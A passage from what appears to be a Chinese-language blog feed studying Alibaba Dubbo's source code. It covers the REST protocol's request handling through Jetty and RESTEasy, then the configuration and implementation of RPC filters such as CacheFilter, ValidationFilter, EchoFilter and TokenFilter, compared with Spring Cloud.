class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">pluginManagement</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-resources-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">delimiters</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">delimiter</span>&gt;</span>@<span class="hljs-tag">&lt;/<span class="hljs-name">delimiter</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">delimiters</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">useDefaultDelimiters</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">useDefaultDelimiters</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/resources<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">filtering</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">filtering</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">modules</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">module</span>&gt;</span>dubbox-demo-v-facade<span class="hljs-tag">&lt;/<span class="hljs-name">module</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">module</span>&gt;</span>dubbox-demo-v-server<span class="hljs-tag">&lt;/<span class="hljs-name">module</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">module</span>&gt;</span>dubbox-demo-v-client<span class="hljs-tag">&lt;/<span class="hljs-name">module</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">modules</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre><p>接口配置  </p><pre><code class="hljs java"><span class="hljs-meta">@Path</span>(<span class="hljs-string">"hello"</span>)<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">HelloService</span></span><span class="hljs-class"></span>&#123;<span class="hljs-meta">@POST</span>    <span class="hljs-meta">@Path</span>(<span class="hljs-string">"sayHello"</span>)    <span class="hljs-meta">@Consumes</span>(&#123;MediaType.APPLICATION_JSON&#125;)    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sayHello</span><span class="hljs-params">(HelloReq req)</span></span>;&#125;</code></pre><p>协议配置  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:protocol</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"rest"</span> <span class="hljs-attr">port</span>=<span class="hljs-string">"8090"</span>/&gt;</span></code></pre><h4 id="简单分析其实现-1"><a href="#简单分析其实现-1" class="headerlink" title="简单分析其实现"></a>简单分析其实现</h4><p>wireshark抓到的报文</p><pre><code class="hljs plain">POST &#x2F;hello&#x2F;sayHello HTTP&#x2F;1.1Accept-Encoding: gzip, deflateContent-Type: application&#x2F;jsonContent-Length: 16Host: 172.17.0.224:8090Connection: Keep-AliveUser-Agent: Apache-HttpClient&#x2F;4.5.3 (Java&#x2F;1.8.0_121)&#123;&quot;name&quot;:&quot;simon&quot;&#125;HTTP&#x2F;1.1 204 No ContentServer: Jetty(6.1.26)</code></pre><p>入口协议：  </p><pre><code class="hljs properties"><span class="hljs-attr">rest</span>=<span class="hljs-string">com.alibaba.dubbo.rpc.protocol.rest.RestProtocol</span></code></pre><p>handler： com.alibaba.dubbo.rpc.protocol.rest.DubboHttpServer$RestHandler  </p><p>实现了dubbo的com.alibaba.dubbo.remoting.http.HttpHandler  </p><p>接口约定行为如下：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException</span>;</code></pre><p>到handler的调用堆栈  </p><pre><code class="hljs java">com.alibaba.dubbo.rpc.protocol.rest.DubboHttpServer$RestHandler.handle(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) line: <span class="hljs-number">88</span>com.alibaba.dubbo.remoting.http.servlet.DispatcherServlet.service(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) line: <span class="hljs-number">61</span>com.alibaba.dubbo.remoting.http.servlet.DispatcherServlet(javax.servlet.http.HttpServlet).service(javax.servlet.ServletRequest, javax.servlet.ServletResponse) line: <span class="hljs-number">770</span>org.mortbay.jetty.servlet.ServletHolder.handle(javax.servlet.ServletRequest, javax.servlet.ServletResponse) line: <span class="hljs-number">511</span>org.mortbay.jetty.servlet.ServletHandler.handle(java.lang.String, javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">401</span>org.mortbay.jetty.servlet.SessionHandler.handle(java.lang.String, javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">182</span>org.mortbay.jetty.servlet.Context(org.mortbay.jetty.handler.ContextHandler).handle(java.lang.String, javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">766</span>org.mortbay.jetty.Server(org.mortbay.jetty.handler.HandlerWrapper).handle(java.lang.String, javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">152</span>org.mortbay.jetty.Server.handle(org.mortbay.jetty.HttpConnection) line: <span class="hljs-number">326</span>org.mortbay.jetty.HttpConnection.handleRequest() line: <span class="hljs-number">542</span>org.mortbay.jetty.HttpConnection$RequestHandler.content(org.mortbay.io.Buffer) line: <span class="hljs-number">945</span>org.mortbay.jetty.HttpParser.parseNext() line: <span class="hljs-number">756</span>org.mortbay.jetty.HttpParser.parseAvailable() line: <span class="hljs-number">218</span>org.mortbay.jetty.HttpConnection.handle() line: <span class="hljs-number">404</span>org.mortbay.jetty.nio.SelectChannelConnector$ConnectorEndPoint(org.mortbay.io.nio.SelectChannelEndPoint).run() line: <span class="hljs-number">410</span>org.mortbay.thread.QueuedThreadPool$PoolThread.run() line: <span class="hljs-number">582</span></code></pre><p>com.alibaba.dubbo.rpc.protocol.rest.DubboHttpServer$RestHandler 中的HttpServletDispatcher<br>org.jboss.resteasy.plugins.server.servlet.HttpServletDispatcher@6e62b305</p><p>调用到业务方法的堆栈：  </p><pre><code class="hljs java">com.code260.ss.dubbo.demov.server.service.impl.HelloServiceImpl.sayHello(com.code260.ss.dubbo.demov.facade.bean.HelloReq) line: <span class="hljs-number">37</span>com.alibaba.dubbo.common.bytecode.Wrapper1.invokeMethod(java.lang.Object, java.lang.String, java.lang.Class[], java.lang.Object[]) line: not availablecom.alibaba.dubbo.rpc.proxy.javassist.JavassistProxyFactory$<span class="hljs-number">1</span>.doInvoke(T, java.lang.String, java.lang.Class&lt;?&gt;[], java.lang.Object[]) line: <span class="hljs-number">47</span>com.alibaba.dubbo.rpc.proxy.javassist.JavassistProxyFactory$<span class="hljs-number">1</span>(com.alibaba.dubbo.rpc.proxy.AbstractProxyInvoker&lt;T&gt;).invoke(com.alibaba.dubbo.rpc.Invocation) line: <span class="hljs-number">76</span>com.alibaba.dubbo.config.invoker.DelegateProviderMetaDataInvoker&lt;T&gt;.invoke(com.alibaba.dubbo.rpc.Invocation) line: <span class="hljs-number">52</span>com.alibaba.dubbo.registry.integration.RegistryProtocol$InvokerDelegete&lt;T&gt;(com.alibaba.dubbo.rpc.protocol.InvokerWrapper&lt;T&gt;).invoke(com.alibaba.dubbo.rpc.Invocation) line: <span class="hljs-number">56</span>com.alibaba.dubbo.rpc.filter.ExceptionFilter.invoke(com.alibaba.dubbo.rpc.Invoker&lt;?&gt;, com.alibaba.dubbo.rpc.Invocation) line: <span class="hljs-number">62</span>com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper$<span class="hljs-number">1</span>.invoke(com.alibaba.dubbo.rpc.Invocation) line: <span class="hljs-number">72</span><span class="hljs-comment">// ......</span>com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper$<span class="hljs-number">1</span>.invoke(com.alibaba.dubbo.rpc.Invocation) line: <span class="hljs-number">72</span>com.alibaba.dubbo.rpc.proxy.InvokerInvocationHandler.invoke(java.lang.Object, java.lang.reflect.Method, java.lang.Object[]) line: <span class="hljs-number">52</span>com.alibaba.dubbo.common.bytecode.proxy0.sayHello(com.code260.ss.dubbo.demov.facade.bean.HelloReq) line: not availablesun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) line: not available [<span class="hljs-keyword">native</span> method]sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: <span class="hljs-number">62</span>sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: <span class="hljs-number">43</span>java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object...) line: <span class="hljs-number">498</span>org.jboss.resteasy.core.MethodInjectorImpl.invoke(org.jboss.resteasy.spi.HttpRequest, org.jboss.resteasy.spi.HttpResponse, java.lang.Object) line: <span class="hljs-number">137</span>org.jboss.resteasy.core.ResourceMethodInvoker.invokeOnTarget(org.jboss.resteasy.spi.HttpRequest, org.jboss.resteasy.spi.HttpResponse, java.lang.Object) line: <span class="hljs-number">288</span>org.jboss.resteasy.core.ResourceMethodInvoker.invoke(org.jboss.resteasy.spi.HttpRequest, org.jboss.resteasy.spi.HttpResponse, java.lang.Object) line: <span class="hljs-number">242</span>org.jboss.resteasy.core.ResourceMethodInvoker.invoke(org.jboss.resteasy.spi.HttpRequest, org.jboss.resteasy.spi.HttpResponse) line: <span class="hljs-number">229</span>org.jboss.resteasy.core.SynchronousDispatcher.invoke(org.jboss.resteasy.spi.HttpRequest, org.jboss.resteasy.spi.HttpResponse, org.jboss.resteasy.core.ResourceInvoker) line: <span class="hljs-number">356</span>org.jboss.resteasy.core.SynchronousDispatcher.invoke(org.jboss.resteasy.spi.HttpRequest, org.jboss.resteasy.spi.HttpResponse) line: <span class="hljs-number">179</span>org.jboss.resteasy.plugins.server.servlet.ServletContainerDispatcher.service(java.lang.String, javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">220</span>org.jboss.resteasy.plugins.server.servlet.HttpServletDispatcher.service(java.lang.String, javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) line: <span class="hljs-number">56</span>org.jboss.resteasy.plugins.server.servlet.HttpServletDispatcher.service(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) line: <span class="hljs-number">51</span>org.jboss.resteasy.plugins.server.servlet.HttpServletDispatcher(javax.servlet.http.HttpServlet).service(javax.servlet.ServletRequest, javax.servlet.ServletResponse) line: <span class="hljs-number">770</span>com.alibaba.dubbo.rpc.protocol.rest.DubboHttpServer$RestHandler.handle(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) line: <span class="hljs-number">89</span></code></pre><p>总体上看，默认情况下 http server由jetty实现。rest部分由resteasy实现。当然，也可以配置成其他方式。  </p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]27.各个filter分析以及和spring cloud对比</title>
    <link href="/2020/06/13/dubbo-27.filters-impl/"/>
    <url>/2020/06/13/dubbo-27.filters-impl/</url>
    
    <content type="html"><![CDATA[<h2 id="27-各个filter分析以及和spring-cloud对比"><a href="#27-各个filter分析以及和spring-cloud对比" class="headerlink" title="27.各个filter分析以及和spring cloud对比"></a>27.各个filter分析以及和spring cloud对比</h2><p>主要阐述dubbo rpc的filter的实现，包括作用，用法，原理，与Spring Cloud在这些能力的对比。  </p><h3 id="共提供了多少个？是哪些-发布时默认装配了哪些给他自身的扩展点机制？"><a href="#共提供了多少个？是哪些-发布时默认装配了哪些给他自身的扩展点机制？" class="headerlink" title="共提供了多少个？是哪些?发布时默认装配了哪些给他自身的扩展点机制？"></a>共提供了多少个？是哪些?发布时默认装配了哪些给他自身的扩展点机制？</h3><p>从类与接口关系分析的结果文档中可以看到共20个：<br>241 Filter<br>–241.1 CacheFilter<br>–241.2 MonitorFilter<br>–241.3 AccessLogFilter<br>–241.4 ActiveLimitFilter<br>–241.5 ClassLoaderFilter<br>–241.6 CompatibleFilter<br>–241.7 ConsumerContextFilter<br>–241.8 ContextFilter<br>–241.9 DeprecatedFilter<br>–241.10 EchoFilter<br>–241.11 ExceptionFilter<br>–241.12 ExecuteLimitFilter<br>–241.13 GenericFilter<br>–241.14 GenericImplFilter<br>–241.15 TimeoutFilter<br>–241.16 TokenFilter<br>–241.17 TpsLimitFilter<br>–241.18 FutureFilter<br>–241.19 TraceFilter<br>–241.20 ValidationFilter  </p><p>从发布的jar中的META-INF/dubbo/internal/com.alibaba.dubbo.rpc.Filter中发现除了TpsLimitFilter之外，其余的都装上了。<br>cache=com.alibaba.dubbo.cache.filter.CacheFilter<br>validation=com.alibaba.dubbo.validation.filter.ValidationFilter<br>echo=com.alibaba.dubbo.rpc.filter.EchoFilter<br>generic=com.alibaba.dubbo.rpc.filter.GenericFilter<br>genericimpl=com.alibaba.dubbo.rpc.filter.GenericImplFilter<br>token=com.alibaba.dubbo.rpc.filter.TokenFilter<br>accesslog=com.alibaba.dubbo.rpc.filter.AccessLogFilter<br>activelimit=com.alibaba.dubbo.rpc.filter.ActiveLimitFilter<br>classloader=com.alibaba.dubbo.rpc.filter.ClassLoaderFilter<br>context=com.alibaba.dubbo.rpc.filter.ContextFilter<br>consumercontext=com.alibaba.dubbo.rpc.filter.ConsumerContextFilter<br>exception=com.alibaba.dubbo.rpc.filter.ExceptionFilter<br>executelimit=com.alibaba.dubbo.rpc.filter.ExecuteLimitFilter<br>deprecated=com.alibaba.dubbo.rpc.filter.DeprecatedFilter<br>compatible=com.alibaba.dubbo.rpc.filter.CompatibleFilter<br>timeout=com.alibaba.dubbo.rpc.filter.TimeoutFilter<br>trace=com.alibaba.dubbo.rpc.protocol.dubbo.filter.TraceFilter<br>future=com.alibaba.dubbo.rpc.protocol.dubbo.filter.FutureFilter<br>monitor=com.alibaba.dubbo.monitor.support.MonitorFilter  </p><h3 id="这些filter都有什么作用？如何使用？实现原理是什么？Spring-Cloud是否也提供了这些能力？有什么差异？"><a href="#这些filter都有什么作用？如何使用？实现原理是什么？Spring-Cloud是否也提供了这些能力？有什么差异？" class="headerlink" title="这些filter都有什么作用？如何使用？实现原理是什么？Spring Cloud是否也提供了这些能力？有什么差异？"></a>这些filter都有什么作用？如何使用？实现原理是什么？Spring Cloud是否也提供了这些能力？有什么差异？</h3><a id="more"></a><h4 id="CacheFilter"><a href="#CacheFilter" class="headerlink" title="CacheFilter"></a>CacheFilter</h4><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>缓存调用结果，比如配置在consumer端， 比如我们通过id查某个用户的信息，对于特定的一个id，在consumer端第一次调用时会给provider端发请求，后面再调用时，直接用consumer端缓存的结果返回，你不再发请求给provider端。  </p><h5 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h5><p>consumer侧的配置：  </p><p>&lt;dubbo:reference id=”userService” interface=”org.simonme.dubbo.demo.provider.service.UserService” filter=”cache”&gt;<br>    &lt;dubbo:parameter key=”cache” value=”lru” /&gt;<br></dubbo:reference>  </p><p>能支持的全部cache定义在META-INF/dubbo/internal/com.alibaba.dubbo.cache.CacheFactory 当然你也可以遵循dubbo扩展点机制进行扩展。<br>默认提供三种：<br>threadlocal=com.alibaba.dubbo.cache.support.threadlocal.ThreadLocalCacheFactory<br>lru=com.alibaba.dubbo.cache.support.lru.LruCacheFactory<br>jcache=com.alibaba.dubbo.cache.support.jcache.JCacheFactory  </p><h5 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h5><p><code>缓存的key</code>是你远程方法调用时传递的所有参数按<code>规则</code>组装成字符串作为key。<br>具体规则就是： 基本类型 直接拼接，复合类型转成json字符串后再拼接。  </p><p>实现原理也不是很复杂，根据invoker的url找到其对应的cache对象，再跟据上述<code>缓存的key</code>找到缓存的结果。<br>有个不是太要紧的小问题，因为是根据invoker的url找到其对应的cache对象的，又因为invoker的url中含有remote.timestamp参数，所以你如果启用了consumer侧的缓存，consumer一直在服务状态，此时provider服务做了重启，那么consumer侧的缓存失效，会重新调用provider端。  </p><p>ThreadLocalCache 是ThreadLocal配合HashMap实现<br>LRUCache 是继承自LinkedHashMap，同时结合ReentrantLock实现的线程安全的lru cache(最近最少使用)，LinkedHashMap自带lru性质，通过构造参数控制，默认是fifo。<br>jache是封装的JCache API (JSR 107)。    </p><h5 id="与Spring-Cloud对比"><a href="#与Spring-Cloud对比" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>Spring Cloud提供了consumer侧的缓存能力，<code>Hystrix</code>组件支持用requestCache.enabled配置是否启用缓存，也支持用cacheKeyMethod注解指定getkey方法。  </p><h4 id="ValidationFilter"><a href="#ValidationFilter" class="headerlink" title="ValidationFilter"></a>ValidationFilter</h4><h5 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h5><p>在consumer和provider端提供了校验能力</p><h5 id="使用方式-1"><a href="#使用方式-1" class="headerlink" title="使用方式"></a>使用方式</h5><p>假设你要对consumer端进行校验，在配置文件中配置如下：  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"userService"</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.UserService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"validation"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"validation"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"JValidator"</span> /&gt;</span>        <span class="hljs-comment">&lt;!-- 配置一个实现了javax.validation.spi.ValidationProvider&lt;T&gt;接口校验器 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"jvalidation"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"org.hibernate.validator.HibernateValidator"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:reference</span>&gt;</span></code></pre><p>filter要是配置多个的话，用逗号拼接，但是逗号前后不能有空格。<br>此处使用了hibernate的validator ，在你需要校验的接口方法上加校验注解即可，示例如下：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">queryUser</span><span class="hljs-params">(@Range(min=<span class="hljs-number">0</span>,message=<span class="hljs-string">"用户id值不能小于0"</span>)</span><span class="hljs-keyword">int</span> id)</span>;</code></pre><p>当consumer端调用时传递了校验不通过的参数时，会收到ConstraintViolationException的异常。  </p><h5 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h5><p>dubbo对接了javax.validation.Validation，hibernate等都有对其对接的实现，按需使用即可。也就是说dubbo自己不做具体校验的事情。    </p><h5 id="与Spring-Cloud对比-1"><a href="#与Spring-Cloud对比-1" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>spring在很早就支持validator。  </p><h4 id="EchoFilter"><a href="#EchoFilter" class="headerlink" title="EchoFilter"></a>EchoFilter</h4><h5 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h5><p>在provider端提供回声服务的服务端的实现。  </p><h5 id="使用方式-2"><a href="#使用方式-2" class="headerlink" title="使用方式"></a>使用方式</h5><p>这个filter略有特殊，无需在provider端的dubbo:service标签的filter中去配置，只要你在consumer做了echo回声调用，他都会产生作用，调试的时候也能看到能走到EchoFilter中。  </p><p>consumer端的示例代码：  </p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloClientTest</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> HelloService helloService;    <span class="hljs-meta">@SuppressWarnings</span>(<span class="hljs-string">"static-access"</span>)    <span class="hljs-meta">@Test</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testSayHello</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        System.out.println(((EchoService)helloService).$echo(<span class="hljs-string">"aaaa"</span>));    &#125;&#125;</code></pre><p>就是把你的service类强转成EchoService，至于为什么能强转，可以参见之前写的文章 reference bean发起调用  </p><h5 id="实现原理-2"><a href="#实现原理-2" class="headerlink" title="实现原理"></a>实现原理</h5><p>直接看EchoFilter代码，很简单，不再多说。  </p><h5 id="与Spring-Cloud对比-2"><a href="#与Spring-Cloud对比-2" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>Spring Cloud貌似没有这个能力。</p><h4 id="GenericFilter"><a href="#GenericFilter" class="headerlink" title="GenericFilter"></a>GenericFilter</h4><h4 id="GenericImplFilter"><a href="#GenericImplFilter" class="headerlink" title="GenericImplFilter"></a>GenericImplFilter</h4><p>这两个filter上篇文章已经阐述了。</p><h4 id="TokenFilter"><a href="#TokenFilter" class="headerlink" title="TokenFilter"></a>TokenFilter</h4><h5 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h5><p><a href="http://dubbo.apache.org/zh-cn/docs/user/demos/token-authorization.html" target="_blank" rel="noopener">官方文档</a>说法是：  </p><blockquote><p>通过令牌验证在注册中心控制权限，以决定要不要下发令牌给消费者，可以防止消费者绕过注册中心访问提供者，另外通过注册中心可灵活改变授权方式，而不需修改或升级提供者。</p></blockquote><h5 id="使用方式-3"><a href="#使用方式-3" class="headerlink" title="使用方式"></a>使用方式</h5><p>provider端：在provider上配置token值。 TokenFilter会在provider侧校验。 </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:service</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.UserService"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"m00001.app001.xx.userService"</span> <span class="hljs-attr">timeout</span>=<span class="hljs-string">"600000"</span> <span class="hljs-attr">token</span>=<span class="hljs-string">"123456"</span>&gt;</span></code></pre><p>consumer端可以用编程的方式获取后塞， </p><pre><code class="hljs java">RpcContext.getContext().setAttachment(<span class="hljs-string">"token"</span>, <span class="hljs-string">"a37b6115-c171-43cd-b65c-38b636ee96cc"</span>);</code></pre><p>或者通过配置parameter，  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"token"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span> /&gt;</span></code></pre><p>或者<code>啥都不要处理</code>，默认consumer会从provider服务url中解析到。provider的url中会含有token字段。  </p><h5 id="实现原理-3"><a href="#实现原理-3" class="headerlink" title="实现原理"></a>实现原理</h5><p>如果 token 配置的是true， 那么在provider export服务时，<code>ServiceConfig</code>会生成UUID，这个其实不是由注册中心生成的。<br>当然token也支持配置固定密码。<br>比对过程：   </p><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!ConfigUtils.isEmpty(token)) &#123;    <span class="hljs-keyword">if</span> (ConfigUtils.isDefault(token)) &#123;<span class="hljs-comment">// 是 true或者default字段串就是表示默认</span>        map.put(Constants.TOKEN_KEY, UUID.randomUUID().toString());    &#125; <span class="hljs-keyword">else</span> &#123;        map.put(Constants.TOKEN_KEY, token);    &#125;&#125;</code></pre><p>consumer端如果没有通过上述代码的方式或者parameter配置的方式传送token，那么consumer端会在调用时，先将从注册中心拿到的provider端的url中部分参数转换成attachment给consumer端用，这个部分参数就包括token。具体代码在<code>DubboInvoker</code>中，如下：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DubboInvoker</span><span class="hljs-params">(Class&lt;T&gt; serviceType, URL url, ExchangeClient[] clients, Set&lt;Invoker&lt;?&gt;&gt; invokers)</span> </span>&#123;    <span class="hljs-keyword">super</span>(serviceType, url, <span class="hljs-keyword">new</span> String[]&#123;Constants.INTERFACE_KEY, Constants.GROUP_KEY, Constants.TOKEN_KEY, Constants.TIMEOUT_KEY&#125;);<span class="hljs-comment">// 此处会调用父类方法进行需要的参数从url转到attachment中</span>    <span class="hljs-keyword">this</span>.clients = clients;    <span class="hljs-comment">// get version.</span>    <span class="hljs-keyword">this</span>.version = url.getParameter(Constants.VERSION_KEY, <span class="hljs-string">"0.0.0"</span>);    <span class="hljs-keyword">this</span>.invokers = invokers;&#125;</code></pre><p>当provider端使用注册中心，consumer试图不带token进行直接消费时，会被拒绝。 当consumer端也是连注册中心时，哪怕不送显式送token(实际上dubbo会自动送)也可以正常调用。但是如果consumer端用了注册中心，且显式送了token，那么就要送对。否则报错。</p><h5 id="与Spring-Cloud对比-3"><a href="#与Spring-Cloud对比-3" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h5><p>Spring Cloud的注册中心eureka也是支持密码验证的。</p><h4 id="AccessLogFilter"><a href="#AccessLogFilter" class="headerlink" title="AccessLogFilter"></a>AccessLogFilter</h4><h5 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h5><p>用在provider端打印rpc请求日志，支持打到指定文件，支持异步。  </p><h5 id="使用方式-4"><a href="#使用方式-4" class="headerlink" title="使用方式"></a>使用方式</h5><p>在provider侧配置名为accesslog的filter，若需要指定路径，则将accesslog参数设置成具体路径即可,默认需要将其配置成true。  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:service</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.UserService"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"m00001.app001.xx.userService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"accesslog"</span> </span><span class="hljs-tag">    <span class="hljs-attr">timeout</span>=<span class="hljs-string">"600000"</span> <span class="hljs-attr">token</span>=<span class="hljs-string">"123456"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> 